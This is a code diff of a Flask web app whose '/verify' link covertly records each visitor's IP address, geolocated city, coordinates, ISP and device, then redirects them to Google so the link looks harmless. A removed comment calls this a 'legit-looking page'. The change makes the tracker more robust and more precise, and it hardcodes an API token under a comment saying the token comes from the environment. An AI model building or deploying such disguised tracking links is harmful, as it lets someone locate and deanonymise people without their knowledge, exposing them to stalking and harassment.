@@ -4,32 +4,50 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-IPINFO_TOKEN = "faff49844191d5"  # free token
+# Read token from environment variable
+IPINFO_TOKEN = "faff49844191d5"
+
+@app.route("/")
+def home():
+    return "Verification service active"
 
 @app.route("/verify")
 def track():
-    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    # Get real client IP behind proxy
+    forwarded = request.headers.get("X-Forwarded-For")
+    ip = forwarded.split(",")[0].strip() if forwarded else request.remote_addr
+
     user_agent = request.headers.get("User-Agent")
-    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    time = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
 
-    geo = requests.get(f"https://ipinfo.io/{ip}?token={IPINFO_TOKEN}").json()
+    geo = {}
+    try:
+        response = requests.get(
+            f"https://ipinfo.io/{ip}?token={IPINFO_TOKEN}",
+            timeout=5
+        )
+        geo = response.json()
+    except Exception as e:
+        print("GeoIP lookup failed:", e)
 
-    log = f"""
-    TIME: {time}
-    IP: {ip}
-    CITY: {geo.get('city')}
-    REGION: {geo.get('region')}
-    COUNTRY: {geo.get('country')}
-    ISP: {geo.get('org')}
-    DEVICE: {user_agent}
-    ------------------------
-    """
+    log = {
+        "time": time,
+        "ip": ip,
+        "city": geo.get("city"),
+        "region": geo.get("region"),
+        "country": geo.get("country"),
+        "location": geo.get("loc"),   # lat,long (city-level)
+        "isp": geo.get("org"),
+        "user_agent": user_agent
+    }
 
-    with open("logs.txt", "a") as f:
-        f.write(log)
+    # Print to Render runtime logs
+    print("TRACK LOG:", log)
 
-    # Redirect to legit-looking page
-    return redirect("https://www.google.com")
+    return redirect("https://www.google.com", code=302)
 
-if __name__ == "__main__":
-    app.run()
+# IMPORTANT:
+# Do NOT use app.run()
+# Gunicorn will start the app
+
+ 
